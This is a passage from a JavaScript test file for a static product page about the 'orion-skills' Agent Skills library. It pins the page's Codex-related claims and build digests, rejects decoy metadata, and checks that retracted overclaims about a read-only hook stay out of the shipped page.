      'Copy command: Codex CLI: prove a control binds',
      'Copy command: Codex CLI: prove a deploy is live',
    ],
    'the baked body must be the same App render that browsers hydrate',
  );
  for (const button of findActiveElements(
    root,
    (node) => node.tagName === 'button',
  )) {
    assert.equal(
      attribute(button, 'disabled'),
      '',
      'server-rendered copy controls must be natively disabled without JavaScript',
    );
    assert.equal(
      attribute(button, 'aria-disabled'),
      'true',
      'server-rendered copy controls must expose their disabled state',
    );
  }
});

const governedCodexElementClaims = [
  ['title', 'orion-skills: 26 skills for Claude Code + 3-skill Codex starter set'],
  [
    'p',
    'A curated library of disciplined Agent Skills for Claude Code, with a verified Codex starter set for stale-premise, control-binding, and live-deploy proof.',
  ],
  [
    'p',
    'Open source (MIT) · 26 skills for Claude Code · 3 verified for Codex · Loaded on demand · No plugin marketplace.',
  ],
  [
    'p',
    'A small, curated set of workflow- and finish-discipline skills — not tool wrappers. The full 26-skill library targets Claude Code. The Codex starter set is the exact three portable verification disciplines validated by the source project. Each is a folder with a SKILL.md that loads on demand when the task matches, keeping specialized procedure out of the base prompt.',
  ],
  [
    'p',
    'The full Claude Code library uses slash-command invocation or description matching. Codex exposes the verified starter skills with its native $skill-name invocation after installation.',
  ],
  [
    'p',
    'Choose your host. Claude Code can load the full library from ~/.claude/skills/. Codex users can install the verified three-skill starter set directly from GitHub. The Codex requests are pinned to reviewed source c334ca4; run each installer request as a separate Codex prompt. If one skill already exists, inspect or deliberately update that installation, then continue with the other prompts; one existing destination cannot prevent the other skills from being installed. Both paths are direct local installation with no plugin marketplace.',
  ],
  ['span', 'Codex CLI: re-probe stale premises'],
  ['span', 'run as its own Codex prompt'],
  ['span', 'Codex CLI: prove a control binds'],
  ['span', 'run as its own Codex prompt'],
  ['span', 'Codex CLI: prove a deploy is live'],
  ['span', 'run as its own Codex prompt'],
  [
    'p',
    'Codex starter set: reprobe-stale-premise · prove-control-binds · prove-deploy-is-live',
  ],
  [
    'dd',
    'Hands a scoped subagent, bulk, or background task to a non-Anthropic model CLI (Codex on a ChatGPT plan, Grok on a metered xAI key, or a free local model via Ollama) so it runs off the Anthropic budget with native tool calling, behind a sandbox and env-scrub gate. Shells out to each vendor CLI, not an ANTHROPIC_BASE_URL router-proxy.',
  ],
  [
    'p',
    'Claude Code loads copied folders from ~/.claude/skills/. Codex installs the verified starter set directly from the source repository. Both are local skill paths with no plugin marketplace.',
  ],
];

const governedCodexAttributeClaims = [
  [
    'meta',
    'content',
    governedDocumentDescription,
  ],
  ['meta', 'content', governedDocumentTitle],
  [
    'meta',
    'content',
    '26 disciplined Agent Skills for Claude Code, plus a verified three-skill Codex starter set. Direct local install; no plugin marketplace.',
  ],
  ['meta', 'content', socialCardUrl],
  [
    'meta',
    'content',
    'orion-skills: 26 Claude Code skills and a three-skill Codex starter set',
  ],
  ['meta', 'content', governedDocumentTitle],
  [
    'meta',
    'content',
    '26 disciplined Agent Skills for Claude Code, plus a verified three-skill Codex starter set. Direct local install; no plugin marketplace.',
  ],
  ['meta', 'content', socialCardUrl],
  [
    'meta',
    'content',
    'orion-skills: 26 Claude Code skills and a three-skill Codex starter set',
  ],
  [
    'button',
    'aria-label',
    'Copy command: Codex CLI: re-probe stale premises',
  ],
  [
    'button',
    'aria-label',
    'Copy command: Codex CLI: prove a control binds',
  ],
  [
    'button',
    'aria-label',
    'Copy command: Codex CLI: prove a deploy is live',
  ],
];

const governedCodexJsonLdClaims = [
  codexStarterStructuredId,
  codexStarterStructuredId,
  'orion-skills Codex starter set',
  'A verified three-skill Codex starter set for stale-premise, control-binding, and live-deploy proof, pinned to reviewed source c334ca4.',
  'Codex CLI',
];
// Re-pinned 2026-08-09 alongside deriving the `readonly` release warning from
// VERSION. The digest covers ancestor CONTEXT around Codex copy, so it also
// moves when a sibling entry in the same container changes, even though no
// Codex claim did. Verified before re-pinning: the element/attribute/JSON-LD
// claim manifests above still deep-equal the built artifact exactly, and the
// source change touches no Codex string.
const governedCodexElementContextDigest =
  '341a11a74284f23c17853dd954086c540cd58b2e39c9339c00abe42be8241071';

const codexElementClaims = (document) => {
  const containsCodex = (node) =>
    /\bCodex\b/i.test(normalizeWhitespace(htmlText(node)));
  return findElements(
    document,
    (node) =>
      !isJsonLdScript(node) &&
      containsCodex(node) &&
      findElements(node, (candidate) => containsCodex(candidate)).length === 1,
  ).map((node) => [node.tagName, normalizeWhitespace(htmlText(node))]);
};

const codexAttributeClaims = (document) =>
  findElements(document, () => true).flatMap((node) =>
    (node.attrs ?? [])
      .filter((candidate) => /\bCodex\b/i.test(candidate.value))
      .map((candidate) => [node.tagName, candidate.name, candidate.value]),
  );

const codexJsonLdClaims = (document) =>
  decodedJsonLdStrings(document).filter((value) => /\bCodex\b/i.test(value));

const codexElementContextDigest = (document) => {
  const contexts = findElements(
    document,
    (node) =>
      !isJsonLdScript(node) &&
      /\bCodex\b/i.test(normalizeWhitespace(htmlText(node))),
  ).map((node) => [node.tagName, serializeOuter(node)]);

  return createHash('sha256')
    .update(JSON.stringify(contexts))
    .digest('hex');
};

const assertGovernedCodexClaims = (document) => {
  assert.deepEqual(
    codexElementClaims(document),
    governedCodexElementClaims,
    'visible Codex copy must exactly match the governed claim manifest',
  );
  assert.deepEqual(
    codexAttributeClaims(document),
    governedCodexAttributeClaims,
    'attribute Codex copy must exactly match the governed claim manifest',
  );
  assert.deepEqual(
    codexJsonLdClaims(document),
    governedCodexJsonLdClaims,
    'JSON-LD Codex copy must exactly match the governed claim manifest',
  );
  assert.equal(
    codexElementContextDigest(document),
    governedCodexElementContextDigest,
    'every ancestor context around visible Codex copy must match the governed claim manifest',
  );
};

test('the shipped artifact exposes only governed Codex claim surfaces', () => {
  assertGovernedCodexClaims(document);
  assertGovernedCodexClaims(noScriptDocument);

  const visibleDecoy = parseArtifact(
    html.replace(
      '</body>',
      '<p>Every skill supports <span>Codex</span></p></body>',
    ),
  );
  assert.throws(
    () => assertGovernedCodexClaims(visibleDecoy),
    /visible Codex copy.*governed claim manifest/i,
  );

  const ancestorDecoy = parseArtifact(
    html.replace(
      '<span class="text-sm font-medium text-neutral-900">Codex CLI: re-probe stale premises</span>',
      '<div>Every skill supports <span class="text-sm font-medium text-neutral-900">Codex CLI: re-probe stale premises</span></div>',
    ),
  );
  assert.throws(
    () => assertGovernedCodexClaims(ancestorDecoy),
    /governed claim manifest/i,
  );

  const hiddenClassDecoy = parseArtifact(
    html.replace(
      '<main id="main-content"',
      '<main class="hidden" id="main-content"',
    ),
  );
  assert.throws(
    () => assertGovernedCodexClaims(hiddenClassDecoy),
    /governed claim manifest/i,
  );

  const hiddenNarrowingDecoy = parseArtifact(
    html.replace(
      '26 skills for Claude Code · 3 verified for Codex',
      '26 skills for Claude Code · <span class="sr-only">3 </span>verified for Codex',
    ),
  );
  assert.throws(
    () => assertGovernedCodexClaims(hiddenNarrowingDecoy),
    /governed claim manifest/i,
  );

  for (const invisibleDecoy of [
    '<p>Every skill supports Co&shy;dex</p>',
    '<p>Every skill supports Co\u200Bdex</p>',
  ]) {
    const invisibleCharacterClaim = parseArtifact(
      html.replace('</body>', `${invisibleDecoy}</body>`),
    );
    assert.throws(
      () => assertGovernedCodexClaims(invisibleCharacterClaim),
      /governed claim manifest/i,
    );
  }

  const attributeDecoy = parseArtifact(
    html.replace(
      '</body>',
      '<div aria-label="All skills support Codex"></div></body>',
    ),
  );
  assert.throws(
    () => assertGovernedCodexClaims(attributeDecoy),
    /attribute Codex copy.*governed claim manifest/i,
  );

  const jsonLdDecoy = parseArtifact(
    html.replace(
      '"runtimePlatform": "Codex CLI",',
      '"runtimePlatform": "Codex CLI", "claim": "All skills support Codex",',
    ),
  );
  assert.throws(
    () => assertGovernedCodexClaims(jsonLdDecoy),
    /JSON-LD Codex copy.*governed claim manifest/i,
  );
});

test('a first-position social metadata decoy cannot shadow governed values', () => {
  const decoy = parseArtifact(
    html.replace(
      '<meta property="og:type"',
      '<meta property="og:image" content="https://cdn.example.test/claude-only-card.png" />\n  <meta property="og:type"',
    ),
  );

  assert.throws(
    () => assertGovernedSocialMetadata(decoy),
    /exactly once|unique|duplicate/i,
  );
});

test('whitespace-wrapped social metadata keys cannot hide a decoy', () => {
  const decoy = parseArtifact(
    html.replace(
      '<meta property="og:type"',
      '<meta property=" og:image " content="https://cdn.example.test/claude-only-card.png" />\n  <meta property="og:type"',
    ),
  );

  assert.throws(
    () => assertGovernedSocialMetadata(decoy),
    /exactly once|single token|duplicate/i,
  );
});

test('first-position discovery metadata decoys cannot shadow governed values', () => {
  const decoy = parseArtifact(
    html.replace(
      '<title>',
      '<title>orion-skills: Claude-only decoy</title>\n  <title>',
    ),
  );

  assert.throws(
    () => assertGovernedDocumentMetadata(decoy),
    /exactly once/i,
  );
});

test('whitespace-wrapped document metadata keys cannot hide a decoy', () => {
  const decoy = parseArtifact(
    html.replace(
      '<meta name="description"',
      '<meta name=" description " content="Claude-only decoy" />\n  <meta name="description"',
    ),
  );

  assert.throws(
    () => assertGovernedDocumentMetadata(decoy),
    /exactly once|single token|duplicate/i,
  );
});

test('search, social, and structured metadata name both runtime surfaces', () => {
  assertGovernedDocumentMetadata(document);
  assertGovernedDocumentMetadata(noScriptDocument);
  assertGovernedSocialMetadata(document);
  assertGovernedSocialMetadata(noScriptDocument);
  assert.match(html, /<title>[^<]*Claude Code[^<]*Codex[^<]*<\/title>/i);
  assert.match(
    html,
    /<meta name="description"\s+content="[^"]*26[^"]*Claude Code[^"]*three-skill Codex starter set[^"]*"/i,
  );
  assert.match(html, /<meta property="og:title" content="[^"]*Claude Code[^"]*Codex/i);
  assert.match(html, /<meta name="twitter:title" content="[^"]*Claude Code[^"]*Codex/i);
  assert.match(
    html,
    new RegExp(
      `<meta property="og:image" content="https://www\\.danmercede\\.com/works/orion-skills/${socialCardName}"`,
    ),
  );
  assert.match(
    html,
    new RegExp(
      `<meta name="twitter:image" content="https://www\\.danmercede\\.com/works/orion-skills/${socialCardName}"`,
    ),
  );
  assert.doesNotMatch(html, /\/og-card\.png/);
  assert.match(
    html,
    /<meta property="og:image:alt" content="orion-skills: 26 Claude Code skills and a three-skill Codex starter set"/i,
  );

  const { library, codexStarter } =
    assertStructuredDataRuntimeBoundaries(document);
  assertStructuredDataRuntimeBoundaries(noScriptDocument);
  assert.equal(library.runtimePlatform, 'Claude Code');
  assert.match(library.description, /26[^.]*Claude Code/i);
  assert.doesNotMatch(library.description, /Codex/i);
  assert.deepEqual(library.hasPart, { '@id': codexStarter['@id'] });

  assert.equal(codexStarter.runtimePlatform, 'Codex CLI');
  assert.match(codexStarter.description, /three-skill Codex starter set/i);
  assert.deepEqual(codexStarter.keywords, starterSkills);
  assert.deepEqual(codexStarter.isPartOf, { '@id': library['@id'] });
});

test('the reviewed HTML, stylesheet, and hydrated runtime bytes stay content-bound', () => {
  const localAssetPaths = findElements(
    document,
    (node) =>
      (
        node.tagName === 'link' &&
        attribute(node, 'rel')
          ?.toLowerCase()
          .split(/\s+/)
          .includes('stylesheet')
      ) ||
      (
        node.tagName === 'script' &&
        attribute(node, 'type')?.trim().toLowerCase() === 'module'
      ),
  )
    .map((node) => attribute(node, node.tagName === 'link' ? 'href' : 'src'))
    .filter((path) =>
      /^\/works\/orion-skills\/assets\/[A-Za-z0-9_-]+\.(?:css|js)$/.test(
        path ?? '',
      ),
    )
    .map((path) => path.slice('/works/orion-skills/'.length));
  const artifactPaths = ['index.html', ...localAssetPaths];
  const actualDigests = Object.fromEntries(
    artifactPaths.map((path) => [
      path,
      createHash('sha256')
        .update(
          readFileSync(new URL(`../dist/${path}`, import.meta.url)),
        )
        .digest('hex'),
    ]),
  );

  assert.deepEqual(actualDigests, {
    'index.html':
      '05490cb1099f094275ddfd733abe5ea33240e439d8d055cdac977cb7025f69bc',
    'assets/index-CHrWXRWb.js':
      '734fe727ae74bf30d92c98c8217520baf1a2fcfc207b09497d6a75bf02e9c05d',
    'assets/index-DbLwydxd.css':
      '81e00b387b713104e2fc3ee8ad9826d08dd06e37c11614dd54afd753a78a3dd9',
  });
});

test('the readonly claim stays scoped to the tools the hook actually matches', () => {
  // The digest pins above are opaque: they prove the bytes did not change
  // without asserting WHAT they say, so a future re-pin could reintroduce a
  // retracted claim and still go green. This test names the semantics instead.
  //
  // History: the site said the hook denies "every file-mutating tool" and
  // suited an audit where "nothing should change". Both are false. The hook
  // registers on Edit|Write|MultiEdit|NotebookEdit, so a write issued through
  // the Bash tool never reaches it.
  // Asserted against the SHIPPED artifact, not the source, so this covers what
  // a reader actually receives rather than what the source intended.
  const shipped = html;

  // The positive disclosures bind to the readonly catalog entry itself, not
  // the whole document: any other entry mentioning these phrases would keep a
  // document-wide check green after the readonly entry regressed. The
  // retracted-claim absence checks below deliberately stay document-wide,
  // because a retracted claim is a regression wherever it reappears.
  const readonlyTerms = findElements(
    document,
    (node) => node.tagName === 'dt' && nodeText(node).trim() === 'readonly',
  );
  assert.equal(
    readonlyTerms.length,
    1,
    'the shipped page must carry exactly one readonly catalog entry (guards against a vacuous pass)',
  );
  const readonlyEntry = serializeOuter(readonlyTerms[0].parentNode);

  assert.ok(
    readonlyEntry.includes('Structural read-only session mode'),
    'the readonly entry must still carry its identifying copy',
  );

  const retracted = ['every file-mutating tool', 'nothing should change'];
  for (const claim of retracted) {
    assert.ok(
      !shipped.includes(claim),
      `the shipped page reintroduced a retracted readonly claim: "${claim}"`,
    );
  }

  // Positive evidence, not just absence: a rewrite could drop the overclaim and
  // the disclosure together and pass an absence-only check.
  assert.ok(
    readonlyEntry.includes('Edit/Write/MultiEdit/NotebookEdit'),
    'the readonly entry must name the tools the readonly matcher actually covers',
  );
  assert.ok(
    /shell writes via Bash stay outside the matcher/i.test(readonlyEntry),
    'the readonly entry must disclose that Bash writes are outside the matcher',
  );

  // The "ships in the repo" claim is itself checkable, so pin it rather than
  // leaving the newest assertion as the one thing a re-pin could quietly
  // change. Grounding: orion-skills main carries
  // skills/readonly/hooks/pretooluse-readonly.sh plus selftest.py.
  // Grounded, and specific about WHICH ref: the hook is on main, but the
  // release this page advertises (v0.5.0, 2026-07-08, only SKILL.md) predates
  // it. Saying "ships in the repo" next to the release call-to-action sends a
  // reader to an artifact that cannot do what the sentence promises. The
  // warning must track whatever release the page advertises, so derive the
  // version from constants.ts instead of freezing a literal here.
  assert.ok(
    /hook ships on main/i.test(readonlyEntry),
    'the readonly entry must say the hook is on main, not merely "in the repo"',
  );
  const constantsSource = readFileSync(
    new URL('../constants.ts', import.meta.url),
    'utf8',
  );
  const advertisedVersion = constantsSource.match(
    /^const VERSION = '([^']+)';$/m,
  )?.[1];
  assert.ok(
    advertisedVersion,
    'constants.ts must declare the advertised release VERSION',
  );
  const advertisedVersionPattern = advertisedVersion.replace(
    /[.*+?^${}()|[\]\\]/g,
    '\\$&',
  );
  assert.ok(
    new RegExp(`newer than the ${advertisedVersionPattern} release`, 'i').test(
      readonlyEntry,
    ),
    'the readonly entry must warn that the advertised release predates the hook',
  );

  // And the arming caveat. Copying a skill folder does not register a
  // PreToolUse hook, so a reader who follows the documented Claude Code install
  // (cp -r skills/*) has an inert hook until they wire it up. Claiming
  // enforcement without that step is the same overclaim this test guards.
  assert.ok(
    /copying the skill does not arm it/i.test(readonlyEntry),
    'the readonly entry must say copying alone does not arm the hook',
  );
  // Arming and registering are separate disclosures: the caveat says copying
  // is not enough, and this names the step that IS enough. Requiring both
  // keeps a rewrite from dropping the actionable half.
  assert.ok(
    /register the hook in your own settings/i.test(readonlyEntry),
    'the readonly entry must tell the reader to register the hook themselves',
  );
});

test('the social card preserves its delivery dimensions', () => {
  const sourcePng = readFileSync(
    new URL(`../public/${socialCardName}`, import.meta.url),
  );
  const shippedPng = readFileSync(
    new URL(`../dist/${socialCardName}`, import.meta.url),
  );
  const pngSignature = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
  const digest = createHash('sha256').update(shippedPng).digest('hex');

  assert.deepEqual(shippedPng, sourcePng);
  assert.equal(
    socialCardName,
    `og-card-codex-starter-${digest.slice(0, 12)}.png`,
    'the social-card cache key must derive from the shipped PNG bytes',
  );
  assert.deepEqual(shippedPng.subarray(0, 8), pngSignature);
  assert.equal(shippedPng.readUInt32BE(16), 1200);
  assert.equal(shippedPng.readUInt32BE(20), 630);
});
